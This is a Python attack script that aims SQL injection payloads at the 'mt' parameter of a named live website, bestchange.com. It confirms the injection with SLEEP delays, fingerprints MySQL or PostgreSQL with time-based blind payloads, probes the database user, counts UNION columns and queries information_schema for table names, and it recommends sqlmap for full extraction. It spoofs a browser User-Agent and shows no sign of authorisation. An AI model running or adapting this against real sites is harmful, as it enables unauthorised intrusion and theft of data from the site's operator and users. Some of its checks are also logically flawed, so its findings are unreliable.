#!/usr/bin/env python3
"""
SQL Injection Exploitation - Data Extraction
Attempts to extract database information using confirmed SQLi vulnerability
"""

import sys
import os
import site
import time
import random
from urllib.parse import urlencode

user_site = site.getusersitepackages()
if user_site and os.path.exists(user_site):
    sys.path.insert(0, user_site)

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class SQLiExploiter:
    """Exploit confirmed SQL injection to extract data."""
    
    def __init__(self):
        self.base_url = "https://www.bestchange.com"
        self.session = requests.Session()
        retry_strategy = Retry(total=1)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        self.findings = []
        self.request_delay = 5.0
    
    def log(self, msg, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.OKCYAN, "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING, "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER, "BOLD": Colors.BOLD
        }
        color = colors.get(level, Colors.ENDC)
        print(f"{color}[{timestamp}] {msg}{Colors.ENDC}")
    
    def test_time_based(self, payload, expected_delay=3):
        """Test time-based SQL injection."""
        url = f"{self.base_url}/index.php"
        params = {'mt': payload}
        
        start = time.time()
        try:
            response = self.session.get(url, params=params, timeout=10)
            elapsed = time.time() - start
            return elapsed, response
        except:
            return None, None
    
    def extract_database_version(self):
        """Attempt to extract database version."""
        self.log("\n[DATA EXTRACTION] Attempting to extract database version", "BOLD")
        
        # MySQL version extraction
        payloads = [
            ("' AND IF(ASCII(SUBSTRING(@@version,1,1))>52,SLEEP(3),0)--", "MySQL version check"),
            ("' AND IF(ASCII(SUBSTRING(VERSION(),1,1))>52,SLEEP(3),0)--", "MySQL VERSION()"),
        ]
        
        for payload, description in payloads:
            self.log(f"  Testing: {description}", "INFO")
            time.sleep(self.request_delay)
            
            elapsed, response = self.test_time_based(payload)
            if elapsed and elapsed > 2.5:
                self.log(f"    ✓ Time delay detected ({elapsed:.2f}s) - MySQL likely", "SUCCESS")
                return "MySQL"
        
        # PostgreSQL version extraction
        payloads_pg = [
            ("' AND (SELECT CASE WHEN (ASCII(SUBSTRING(version(),1,1))>52) THEN pg_sleep(3) ELSE pg_sleep(0) END)--", "PostgreSQL version"),
        ]
        
        for payload, description in payloads_pg:
            self.log(f"  Testing: {description}", "INFO")
            time.sleep(self.request_delay)
            
            elapsed, response = self.test_time_based(payload)
            if elapsed and elapsed > 2.5:
                self.log(f"    ✓ Time delay detected ({elapsed:.2f}s) - PostgreSQL likely", "SUCCESS")
                return "PostgreSQL"
        
        return "Unknown"
    
    def extract_current_user(self):
        """Attempt to extract current database user."""
        self.log("\n[DATA EXTRACTION] Attempting to extract current user", "BOLD")
        
        # MySQL user extraction
        payloads = [
            ("' AND IF(ASCII(SUBSTRING(USER(),1,1))>64,SLEEP(2),0)--", "MySQL USER()"),
            ("' AND IF(ASCII(SUBSTRING(CURRENT_USER(),1,1))>64,SLEEP(2),0)--", "MySQL CURRENT_USER()"),
        ]
        
        for payload, description in payloads:
            self.log(f"  Testing: {description}", "INFO")
            time.sleep(self.request_delay)
            
            elapsed, response = self.test_time_based(payload)
            if elapsed and elapsed > 2.5:
                self.log(f"    ✓ User extraction possible", "SUCCESS")
                return True
        
        return False
    
    def test_union_based(self):
        """Test for UNION-based SQL injection."""
        self.log("\n[UNION TESTING] Testing UNION-based extraction", "BOLD")
        
        # Test number of columns
        for num_cols in range(1, 10):
            payload = f"' UNION SELECT {','.join(['NULL'] * num_cols)}--"
            
            self.log(f"  Testing {num_cols} columns...", "INFO")
            time.sleep(self.request_delay)
            
            url = f"{self.base_url}/index.php"
            params = {'mt': payload}
            
            try:
                response = self.session.get(url, params=params, timeout=10)
                if response.status_code == 200:
                    # Check for SQL errors
                    if 'sql' not in response.text.lower() or 'error' not in response.text.lower():
                        self.log(f"    ✓ {num_cols} columns - No error!", "SUCCESS")
                        return num_cols
            except:
                pass
        
        return None
    
    def extract_table_names(self, num_columns):
        """Attempt to extract table names."""
        if not num_columns:
            return []
        
        self.log("\n[DATA EXTRACTION] Attempting to extract table names", "BOLD")
        
        # MySQL information_schema
        payload = f"' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1--"
        
        self.log(f"  Testing table extraction...", "INFO")
        time.sleep(self.request_delay)
        
        url = f"{self.base_url}/index.php"
        params = {'mt': payload}
        
        try:
            response = self.session.get(url, params=params, timeout=10)
            if response.status_code == 200:
                # Look for table names in response
                # This is simplified - real extraction would need blind techniques
                self.log(f"    → Response received (manual analysis needed)", "INFO")
                return True
        except:
            pass
        
        return False
    
    def run(self):
        """Execute SQL injection exploitation."""
        self.log("=" * 80, "HEADER")
        self.log("SQL INJECTION EXPLOITATION - DATA EXTRACTION", "HEADER")
        self.log("=" * 80, "HEADER")
        
        # Confirm vulnerability
        self.log("\n[CONFIRMATION] Confirming SQL injection vulnerability", "BOLD")
        elapsed, _ = self.test_time_based("' AND SLEEP(3)--")
        if elapsed and elapsed > 2.5:
            self.log(f"  ✓ Vulnerability confirmed ({elapsed:.2f}s delay)", "SUCCESS")
        else:
            self.log("  ✗ Vulnerability not confirmed", "ERROR")
            return
        
        # Extract database version
        db_type = self.extract_database_version()
        if db_type != "Unknown":
            finding = {
                'type': 'Database Type Identified',
                'database': db_type,
                'evidence': 'Time-based extraction successful'
            }
            self.findings.append(finding)
        
        # Extract current user
        user_extracted = self.extract_current_user()
        
        # Test UNION-based
        num_columns = self.test_union_based()
        if num_columns:
            self.extract_table_names(num_columns)
        
        self.log("\n[SUMMARY]", "BOLD")
        self.log(f"  Database Type: {db_type}", "INFO")
        self.log(f"  User Extraction: {'Possible' if user_extracted else 'Not confirmed'}", "INFO")
        self.log(f"  UNION Columns: {num_columns if num_columns else 'Not found'}", "INFO")
        
        self.log("\n[NOTE]", "BOLD")
        self.log("  Full data extraction requires blind SQL injection techniques", "INFO")
        self.log("  This test confirms the vulnerability and basic extraction capability", "INFO")
        self.log("  Manual exploitation or automated tools (sqlmap) recommended for full extraction", "INFO")


if __name__ == "__main__":
    exploiter = SQLiExploiter()
    exploiter.run()
